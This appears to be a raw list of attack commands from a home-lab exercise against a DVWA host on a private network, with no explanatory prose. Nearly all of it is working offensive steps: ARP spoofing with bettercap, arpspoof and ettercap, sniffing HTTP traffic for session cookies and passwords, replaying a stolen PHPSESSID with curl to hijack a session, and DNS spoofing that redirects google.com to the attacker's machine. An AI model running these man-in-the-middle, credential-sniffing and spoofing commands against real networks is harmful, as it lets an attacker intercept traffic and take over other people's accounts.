
ip a
route -n
ping -c 3 192.168.111.130
nmap -sV -p 80 192.168.111.130
# arp spoofing
bettercap -iface eth0 -eval "set arp.spoof.targets 192.168.111.130; arp.spoof on; net.sniff on"

arpspoof -i eth0 -t 192.168.111.130 192.168.111.2 &
arpspoof -i eth0 -t 192.168.111.2 192.168.111.130 &
echo 1 > /proc/sys/net/ipv4/ip_forward


ettercap -T -M arp:remote /192.168.111.130// /192.168.111.2//

tcpdump -i eth0 -A 'tcp port 80 and host 192.168.111.130' | head -50

#Session Hijacking 
# for take cookies from wireshark or tcpdump
tcpdump -i eth0 -A 'tcp port 80 and host 192.168.111.130' | grep -a -i -E "PHPSESSID|Cookie|password"
# then use scrpit pyhton
python3 sess_grab.py
curl -s -b "PHPSESSID=<12d50bdcfeca8d4f1515668ba8552e53>" http://192.168.111.130/dvwa/index.php | grep -i -E "admin|Welcome"



#DNS Spoofing
python dsn_spoofing.py

ping -c 2 google.com      
nslookup google.com        
curl -I http://google.com  

#---- ettercap
nano /etc/ettercap/etter.dns
# add 
google.com      A    192.168.111.128
*.google.com    A    192.168.111.128


 ettercap -T -M arp:remote /192.168.111.130// /192.168.111.1// -P dns_spoof












